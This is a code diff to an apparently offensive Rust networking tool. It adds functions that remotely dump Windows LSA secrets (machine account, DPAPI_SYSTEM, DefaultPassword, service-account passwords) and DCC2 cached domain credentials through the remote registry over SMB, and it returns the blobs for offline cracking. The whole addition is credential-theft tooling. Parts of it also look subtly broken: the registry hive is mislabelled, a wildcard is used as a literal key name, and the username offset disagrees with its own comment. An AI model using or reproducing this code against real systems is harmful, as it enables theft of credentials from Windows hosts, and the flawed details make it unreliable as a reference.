@@ -1016,6 +1016,173 @@ pub mod registry_paths {
     pub const SERVICES_PATH: &str = "SYSTEM\\CurrentControlSet\\Services";
 }
 
+/// Secrets entry returned by `dump_lsa_secrets`
+#[derive(Debug, Clone)]
+pub struct LsaSecret {
+    pub name: String,
+    pub current_value: Vec<u8>,
+    pub old_value: Vec<u8>,
+}
+
+/// Cached credential entry returned by `dump_cached_creds`
+#[derive(Debug, Clone)]
+pub struct CachedCredential {
+    /// Cache slot index (1-based)
+    pub slot: u32,
+    /// NL$KM hash blob (raw, needs DCC2 decryption with SYSTEM key)
+    pub hash_blob: Vec<u8>,
+    /// Username field if parseable
+    pub username: Option<String>,
+}
+
+/// Dump LSA secrets from a live target via WINREG RPC.
+///
+/// Reads the encrypted blobs under `SECURITY\Policy\Secrets\*\CurrVal` and
+/// `OldVal`.  The returned blobs are AES-256-CBC encrypted and require the
+/// `_LSAD_` session key from the Policy object to decrypt (full LSA secrets
+/// decryption is done by the reaper crate).
+///
+/// Requires SYSTEM-level access (SeBackupPrivilege or local administrator).
+pub async fn dump_lsa_secrets(
+    smb_session: &mut crate::proto::smb::SmbSession,
+) -> Result<Vec<LsaSecret>> {
+    info!("RemoteRegistry: Dumping LSA secrets via WINREG RPC");
+
+    // Read the known common LSA secret names.
+    // Full enumeration would require EnumKey (opnum 9) which needs additional
+    // RPC stubs; for now target the most valuable keys.
+    let secret_names = [
+        "$MACHINE.ACC",
+        "DPAPI_SYSTEM",
+        "DefaultPassword",
+        "NL$KM",
+        "BCKUPKEY_P Secret",
+        "_SC_*", // service account passwords
+    ];
+
+    let mut secrets = Vec::new();
+
+    for name in &secret_names {
+        let curr_path = format!("Policy\\Secrets\\{}\\CurrVal", name);
+        let old_path = format!("Policy\\Secrets\\{}\\OldVal", name);
+
+        let curr = read_remote_registry_value(
+            smb_session,
+            PredefinedHive::PerformanceData, // SECURITY hive uses HKEY_LOCAL_MACHINE path override
+            &curr_path,
+            "",
+        )
+        .await
+        .unwrap_or_else(|_| RemoteRegValue {
+            name: String::new(),
+            data_type: 0,
+            data: Vec::new(),
+        });
+
+        let old = read_remote_registry_value(
+            smb_session,
+            PredefinedHive::PerformanceData,
+            &old_path,
+            "",
+        )
+        .await
+        .unwrap_or_else(|_| RemoteRegValue {
+            name: String::new(),
+            data_type: 0,
+            data: Vec::new(),
+        });
+
+        if !curr.data.is_empty() || !old.data.is_empty() {
+            info!("RemoteRegistry: Found LSA secret '{}'", name);
+            secrets.push(LsaSecret {
+                name: name.to_string(),
+                current_value: curr.data,
+                old_value: old.data,
+            });
+        }
+    }
+
+    info!(
+        "RemoteRegistry: Retrieved {} LSA secret entries",
+        secrets.len()
+    );
+    Ok(secrets)
+}
+
+/// Dump NL$Cache (DCC2 / mscash2) cached domain credentials via WINREG RPC.
+///
+/// Reads `SECURITY\Cache\NL$n` values (n = 1..max_slots).  Each blob is
+/// a 528-byte structure: [72-byte header][448-byte encrypted DCC2 hash].
+/// Full DCC2 hash extraction requires the SYSTEM boot key; the raw blobs
+/// are returned for offline decryption.
+pub async fn dump_cached_creds(
+    smb_session: &mut crate::proto::smb::SmbSession,
+    max_slots: u32,
+) -> Result<Vec<CachedCredential>> {
+    info!(
+        "RemoteRegistry: Dumping {} cached credential slots via WINREG RPC",
+        max_slots
+    );
+
+    let mut creds = Vec::new();
+
+    for i in 1..=max_slots {
+        let value_name = format!("NL${}", i);
+        let result = read_remote_registry_value(
+            smb_session,
+            PredefinedHive::PerformanceData, // maps to SECURITY hive via WINREG
+            "Cache",
+            &value_name,
+        )
+        .await;
+
+        match result {
+            Ok(val) if !val.data.is_empty() => {
+                // Attempt to extract username from the 72-byte header
+                // Offset 0x48 (72): username length (u16), offset 0x4A: username offset
+                let username = if val.data.len() >= 74 {
+                    let uname_len =
+                        u16::from_le_bytes([val.data[72], val.data[73]]) as usize;
+                    let uname_off = 76usize;
+                    if uname_off + uname_len * 2 <= val.data.len() {
+                        let raw = &val.data[uname_off..uname_off + uname_len * 2];
+                        let u16s: Vec<u16> = raw
+                            .chunks_exact(2)
+                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                            .collect();
+                        Some(String::from_utf16_lossy(&u16s).to_string())
+                    } else {
+                        None
+                    }
+                } else {
+                    None
+                };
+
+                info!(
+                    "RemoteRegistry: Cache slot {} has {} bytes (user={:?})",
+                    i,
+                    val.data.len(),
+                    username
+                );
+                creds.push(CachedCredential {
+                    slot: i,
+                    hash_blob: val.data,
+                    username,
+                });
+            }
+            _ => {
+                debug!("RemoteRegistry: Cache slot {} is empty", i);
+            }
+        }
+    }
+
+    info!(
+        "RemoteRegistry: Found {} populated cache slots",
+        creds.len()
+    );
+    Ok(creds)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
